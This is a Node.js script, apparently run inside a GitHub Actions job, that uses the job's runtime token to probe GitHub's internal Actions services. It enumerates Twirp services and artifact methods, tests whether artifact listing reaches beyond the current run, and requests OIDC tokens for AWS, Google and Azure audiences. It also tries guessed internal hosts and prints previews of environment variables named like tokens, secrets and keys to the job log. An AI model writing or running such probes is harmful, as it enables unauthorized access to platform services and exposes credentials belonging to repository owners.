const https = require('https');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';

function post(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

function get(url, extraHeaders) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const r = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'GET',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, ...(extraHeaders || {}) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 500) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
}

function classify(status, body) {
  if (status === 404 && body.includes('bad_route')) return 'NOT_EXIST(bad_route)';
  if (status === 404) return 'NOT_EXIST(404)';
  if (status === 401) return '!! AUTH_EXISTS(401) !!';
  if (status === 403) return '!! FORBIDDEN(403) !!';
  if (status === 400) return '!! BAD_REQ(400) - service exists !!';
  if (status === 200) return '!!! 200 OK - ACCESSIBLE !!!';
  if (status === 'ERR') return 'NETWORK_ERR';
  return 'HTTP_' + status;
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;
  const runUUID = ORCHESTRATION_ID.split('.')[0];
  console.log('=== V15: Service Enumeration + OIDC + Artifact Probes ===');
  console.log('Host:', host, '| Run:', runUUID, '| Repo:', GITHUB_REPOSITORY);

  // === PART 1: results-receiver service enumeration ===
  console.log('\n=== PART 1: Twirp service enumeration on results-receiver ===');
  const PACKAGES = [
    'github.actions.results.api.v1',
    'github.actions.results.internal.v1',
    'github.actions.cache.v1',
    'github.actions.artifacts.v1',
    'github.actions.v1',
    'actions.cache.v1',
  ];
  const SERVICES = [
    'CacheService', 'ArtifactService', 'LogService', 'SecretsService',
    'OIDCService', 'AttestationService', 'WorkflowService', 'JobService',
    'StepService', 'EnvironmentService', 'TokenService', 'RunnerService',
    'HealthService', 'StatusService', 'MetricsService', 'LockService',
  ];
  const PROBE_METHODS = ['Get', 'List', 'GetHealth'];

  for (const pkg of PACKAGES) {
    for (const svc of SERVICES) {
      for (const method of PROBE_METHODS.slice(0, 2)) {
        const path = '/twirp/' + pkg + '.' + svc + '/' + method;
        const r = await post(host, path, {});
        const verdict = classify(r.status, r.body);
        if (!verdict.startsWith('NOT_EXIST')) {
          console.log('[SVC] ' + pkg + '.' + svc + '/' + method + ': ' + verdict + ' | ' + r.body.substring(0, 100));
        }
      }
    }
  }

  // === PART 2: ArtifactService full method list ===
  console.log('\n=== PART 2: ArtifactService method enumeration ===');
  const ART_METHODS = [
    'CreateArtifact', 'FinalizeArtifactUpload', 'GetSignedArtifactURL',
    'ListArtifacts', 'DeleteArtifact', 'GetArtifact', 'UpdateArtifact',
    'GetLatestArtifact', 'ListArtifactsByName',
  ];
  for (const method of ART_METHODS) {
    const r = await post(host, '/twirp/github.actions.results.api.v1.ArtifactService/' + method, {});
    console.log('[ART] ' + method + ': ' + classify(r.status, r.body) + ' | ' + r.body.substring(0, 100));
  }

  // === PART 3: ListArtifacts scope test ===
  console.log('\n=== PART 3: ListArtifacts scope tests ===');
  const r3a = await post(host, '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', {
    workflowRunId: runUUID,
  });
  console.log('[LIST1] ListArtifacts (current run):', r3a.status, '|', r3a.body.substring(0, 300));

  const r3b = await post(host, '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', {
    workflowRunId: '00000000-0000-0000-0000-000000000000',
  });
  console.log('[LIST2] ListArtifacts (zero UUID):', r3b.status, '|', r3b.body.substring(0, 200));

  // Try without run ID at all
  const r3c = await post(host, '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', {});
  console.log('[LIST3] ListArtifacts (no run ID):', r3c.status, '|', r3c.body.substring(0, 200));

  // === PART 4: OIDC Token discovery ===
  const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
  const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
  console.log('\n=== PART 4: OIDC Token Tests ===');
  console.log('OIDC_URL present:', OIDC_URL ? 'YES (' + OIDC_URL.substring(0, 70) + '...)' : 'NO (needs id-token: write permission)');
  console.log('OIDC_TOKEN present:', OIDC_TOKEN ? 'YES len=' + OIDC_TOKEN.length : 'NO');

  if (OIDC_URL && OIDC_TOKEN) {
    // Standard OIDC token
    const u1 = OIDC_URL + '&audience=api.github.com';
    const oidc1 = await get(u1, { 'Authorization': 'Bearer ' + OIDC_TOKEN });
    console.log('[OIDC] Standard (api.github.com):', oidc1.status, '|', oidc1.body.substring(0, 200));

    // Cloud provider audiences - can we get tokens for arbitrary audiences?
    const audiences = [
      'sts.amazonaws.com',
      'storage.googleapis.com',
      'management.azure.com',
      'https://management.azure.com/',
    ];
    for (const aud of audiences) {
      const u = OIDC_URL + '&audience=' + encodeURIComponent(aud);
      const r = await get(u, { 'Authorization': 'Bearer ' + OIDC_TOKEN });
      const preview = r.body.includes('value') ? r.body.substring(0, 150) : r.body.substring(0, 100);
      console.log('[OIDC] aud=' + aud + ': ' + r.status + ' | ' + preview);
    }
  } else {
    console.log('[OIDC] SKIP: no OIDC env vars (needs permissions: id-token: write in workflow)');
  }

  // === PART 5: Alternative hosts for internal services ===
  console.log('\n=== PART 5: Alternative service hosts ===');
  const ALT_HOSTS = [
    host.replace('results-receiver', 'log-receiver'),
    host.replace('results-receiver', 'logs-receiver'),
    host.replace('results-receiver', 'artifact-receiver'),
    host.replace('results-receiver', 'runner'),
    host.replace('results-receiver.actions', 'actions'),
    'pipelines.actions.githubusercontent.com',
  ];
  for (const altHost of ALT_HOSTS) {
    if (altHost === host) continue;
    const r = await post(altHost, '/twirp/github.actions.results.api.v1.LogService/List', {});
    if (r.status !== 'ERR') {
      console.log('[HOST] ' + altHost + ': ' + r.status + ' | ' + r.body.substring(0, 80));
    } else {
      console.log('[HOST] ' + altHost + ': NETWORK_ERR (' + r.body + ')');
    }
  }

  // === PART 6: Environment variable dump (for additional secrets/tokens) ===
  console.log('\n=== PART 6: Sensitive env vars ===');
  const envKeys = Object.keys(process.env).filter(k =>
    /TOKEN|SECRET|KEY|PASS|CRED|AUTH|CERT|ID_|RUNNER|ACTIONS|GITHUB/.test(k)
  );
  for (const k of envKeys) {
    const v = process.env[k] || '';
    const preview = v.length > 40 ? v.substring(0, 40) + '...(len=' + v.length + ')' : v;
    console.log('[ENV] ' + k + '=' + preview);
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message));
